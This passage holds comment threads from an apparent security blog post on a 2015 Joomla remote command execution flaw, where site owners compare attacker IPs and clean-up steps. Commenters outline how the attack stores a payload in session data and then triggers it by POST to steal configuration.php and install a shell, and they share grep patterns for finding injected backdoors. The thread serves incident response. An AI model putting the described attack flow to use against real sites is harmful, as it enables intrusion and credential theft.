			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T20:29:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7151">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>The attackers knew all they needed to know already.</p>
<p>All we did was to close the gap between the attackers and webmasters. Our post gave visibility to webmasters and helped them react/protect themselves.</p>
<p>Not only webmasters, but many security companies, hosting companies and web developers thanked us for sharing the details and to help them understand their risks.</p>
<p>thanks,</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt depth-2" id="comment-7068">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/28d8746f8e51a51aa7d086610f4bec37?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/28d8746f8e51a51aa7d086610f4bec37?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">SamuelTSteiner</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:48:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7068">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Well they should. They are the only ones that even write about these exploits. When my site got hacked the only freaking site that was able to clear things up was this one.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-2" id="comment-7071">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/28d8746f8e51a51aa7d086610f4bec37?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/28d8746f8e51a51aa7d086610f4bec37?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">SamuelTSteiner</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:55:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7071">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Well they should. They are the only ones that even write about these exploits. When my site got hacked the only freaking site that was able to clear things up was this one.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-2" id="comment-7092">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4cb8e6943b9665a66205f5203559b248?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4cb8e6943b9665a66205f5203559b248?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Martin Saunders</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T10:00:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7092">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>stupid comment to make. Thanks Sucuri for a great service!</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7040">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/0a3b75fa9541f747d239c0cd8eb7ff80?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/0a3b75fa9541f747d239c0cd8eb7ff80?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://gryzli.info" class="comment-author-link" rel="external nofollow" itemprop="url">bugggbear</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T19:12:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7040">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Until now I have seen the following IPs exploiting this exploit:<br />
74.3.170.33<br />
146.0.72.83<br />
173.245.53.153<br />
194.28.174.106<br />
195.191.149.139</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7044">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T20:54:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7044">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Yep, same here.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-3" id="comment-7053">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/0a3b75fa9541f747d239c0cd8eb7ff80?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/0a3b75fa9541f747d239c0cd8eb7ff80?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://gryzli.info" class="comment-author-link" rel="external nofollow" itemprop="url">bugggbear</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T21:24:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7053">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Also, one cloudflare ip showed up, it seems they don&#8217;t filter this..</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-4" id="comment-7054">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T21:26:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7054">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Yep, their free plans don&#8217;t include protection. Not sure if they WAF (for pro and up) have a patch for this yet.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-5" id="comment-7079">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/5a96c8a2bef4ef0f719c1f36ec7b90cf?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/5a96c8a2bef4ef0f719c1f36ec7b90cf?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Dan</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T03:36:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7079">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Can anyone confirm if this vulnerability is blocked or not by:<br />
&#8211; modesecurity<br />
&#8211; cloudflare<br />
&#8211; incapsula</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-5" id="comment-7081">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T03:42:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7081">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>ModSecurity: Their default rules do not block it. </p>
<p>CloudFlare: Not blocking it.</p>
<p>Incapsula: Have not tested it.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-5" id="comment-7082">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/5a96c8a2bef4ef0f719c1f36ec7b90cf?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/5a96c8a2bef4ef0f719c1f36ec7b90cf?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Dan</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T03:53:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7082">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks Daniel.</p>
<p>Is there any simple way we can test to see if vulnerable?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt depth-2" id="comment-7083">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/3e73b77c8b12f30908b132778238336e?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/3e73b77c8b12f30908b132778238336e?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Ngoc Pham</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T04:40:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7083">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Another one found on my server&#8217;s log: 207.244.70.35.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7042">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/ca3e81838f56b2a697de855256c46a93?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/ca3e81838f56b2a697de855256c46a93?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">John</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T20:15:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7042">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Can you tell us what was in the payload? I&#8217;ve had several sites hit with this and it is evaling a post variable($_POST[111].)</p>
<p>Knowing what was in this post variable would be quite helpful!</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7043">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T20:53:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7043">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>That&#8217;s a backdoor that gets injected. So whatever code the attacker provides will be executed.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-3" id="comment-7049">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/b53f222408243b040d402ebb629940a8?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b53f222408243b040d402ebb629940a8?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.lexiconn.com/blog/" class="comment-author-link" rel="external nofollow" itemprop="url">Rob Mangiafico</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T21:11:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7049">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Looked to just be a GET URL though from our log analysis. I checked the database for changed info and could not find any, or any changed files, so I wonder if it was just a probe for now&#8230;?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-4" id="comment-7059">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/e933774aa886b0afcd631dca9b24a325?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/e933774aa886b0afcd631dca9b24a325?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Robert Mathews</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:11:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7059">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>The GET stores that User-Agent string in the jos_sessions database table for that IP address. Your logs should have a subsequent POST from the same IP address with the 111= payload; that&#8217;s where the exploit happens, when Joomla reloads the session data.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-5" id="comment-7062">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/b53f222408243b040d402ebb629940a8?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b53f222408243b040d402ebb629940a8?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.lexiconn.com/blog/" class="comment-author-link" rel="external nofollow" itemprop="url">Rob Mangiafico</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:22:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7062">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Ah, ok, yes saw the POST afterwards. As John mentioned above, it would be nice to know what they did that Sucuri found, as I can&#8217;t seem to find the inserted back-door access in the DB or any files&#8230;</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-5" id="comment-7110">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/dd769e108e17c9c34a4497746f7f9a17?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/dd769e108e17c9c34a4497746f7f9a17?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Jacob Chafik</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T22:11:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7110">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>After doing cleanup &#8211; I found a lot of the sites had modified</p>
<p>/includes/defines.php<br />
/includes/framework.php</p>
<p>It also modified a few PHP files at random to execute a POST payload using preg_replace&#8217;s /e modifier.</p>
<p>Simple way to search would be to search for any files modified in the last week or so<br />
find . -mtime 7<br />
find . -name &#8220;*.php&#8221; -print0 | xargs -0 egrep &#8220;preg.*_replace.+/e.+_POST&#8221;</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-5" id="comment-7119">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f85fd9a270f68cc9a7dc08eeb80dd03c?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f85fd9a270f68cc9a7dc08eeb80dd03c?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Dukes909</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T15:07:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7119">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>My /includes/defines.php has this:<br />
if(strpos(implode($_SERVER),&#8221;O:&#8221;))<br />
How do I find other files that are modified?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-5" id="comment-7122">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/dd769e108e17c9c34a4497746f7f9a17?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/dd769e108e17c9c34a4497746f7f9a17?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Jacob Chafik</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T15:37:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7122">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>That means your site was compromised. Part of the code modification actually closed the hole so others couldn&#8217;t exploit it. From a terminal, run the above `find` commands. The preg replace one will search for any attempts to execute code using POST data. The original `find . -mtime 7` will find any files modified in the last week.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-5" id="comment-7131">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f85fd9a270f68cc9a7dc08eeb80dd03c?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f85fd9a270f68cc9a7dc08eeb80dd03c?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Dukes909</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T15:59:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7131">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks, but I get 0 results doing both find commands you listed.  The /includes/defines.php has a timestamp of September 8, 2015&#8230;?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-5" id="comment-7136">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/dd769e108e17c9c34a4497746f7f9a17?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/dd769e108e17c9c34a4497746f7f9a17?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Jacob Chafik</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T16:41:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7136">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>The exploit has been around for 8 years&#8230; so perhaps your site was attacked earlier? It&#8217;s also not difficult to manipulate the modification time. May also try atime (for access time). If you have weekly/monthly backups, compare with your last one.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-5" id="comment-7143">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f85fd9a270f68cc9a7dc08eeb80dd03c?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f85fd9a270f68cc9a7dc08eeb80dd03c?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Dukes909</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T17:20:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7143">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I do have backups; whats the easiest way to compare file timestamps?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-5" id="comment-7144">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/dd769e108e17c9c34a4497746f7f9a17?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/dd769e108e17c9c34a4497746f7f9a17?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Jacob Chafik</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T17:27:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7144">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I would just compare files in general &#8211; look for any that have been changed. Don&#8217;t forget to check your DB for anything suspicious too.</p>
<p>diff &#8211;brief -r dir1/ dir2/</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-5" id="comment-7105">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/a64395814fc1be8e5373b339a4c88df6?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/a64395814fc1be8e5373b339a4c88df6?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Concerned Joomla</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T17:35:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7105">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Does this mean we can search the jos_sessions table to see if it was successful? What would we search on? The serialized data (ie, JDatabaseDriverMysql)?</p>
<p>Would emptying out the jos_sessions data basically prevent any &#8220;prepped&#8221; (ie, the post failed in deploying the payload but the session is still there waiting to be exploited again)?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt depth-3" id="comment-7051">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/ca3e81838f56b2a697de855256c46a93?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/ca3e81838f56b2a697de855256c46a93?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">John</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T21:19:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7051">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Yes, I know. Since it seems to be automated and you guys are blocking it, I was hoping you knew what their payload was/did, aside from just &#8216;it does bad things.&#8217; </p>
<p>I think there is a decent chance it is consistent, but even if it isn&#8217;t knowing what the one you logged would be quite helpful. </p>
<p>Every site I&#8217;ve checked so far has been hit so far and I have been doing all the normal server checks looking for malicious files, changing passwords, etc, but having an idea of what it was would make life way easier and probably save me some time </p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-4" id="comment-7063">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4f2b3eb7753ca0af5effbeba7f4a8546?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4f2b3eb7753ca0af5effbeba7f4a8546?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Robert Mathews</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:31:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7063">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I replied with a link to a copy of the malicious code being POSTed, but Sucuri didn&#8217;t approve my comment, which is fair enough, I guess.</p>
<p>Anyway: It attempts to echo the contents of the configuration.php file back to the attacker, then patch the buggy files, then install a shell. However, it doesn&#8217;t seem to have succeeded in patching the files or installing the shell on any sites I&#8217;ve seen. Not clear why.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-5" id="comment-7069">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/ca3e81838f56b2a697de855256c46a93?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/ca3e81838f56b2a697de855256c46a93?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">John</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:51:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7069">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Awesome, thanks!</p>
<p>That does make me feel better, as changing the passwords was the first thing I did. I&#8217;ll take another pass on the files tomorrow, but I didn&#8217;t notice any obvious shells(or changes to the database/users) on the sites I checked.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-5" id="comment-7070">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/2c6931f18151b64a4c63042698d852f9?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/2c6931f18151b64a4c63042698d852f9?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Camden Narzt</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T22:52:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7070">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Could you send the link to <a href="mailto:cnarzt@scanimetrics.com">cnarzt@scanimetrics.com</a>?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-5" id="comment-7072">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-14T23:01:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7072">December 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Nope, we didn&#8217;t block any comments. Mind re-sending? Maybe disqus blocked it for some reason.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-5" id="comment-7073">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4f2b3eb7753ca0af5effbeba7f4a8546?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4f2b3eb7753ca0af5effbeba7f4a8546?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Robert Mathews</span> 			</p>

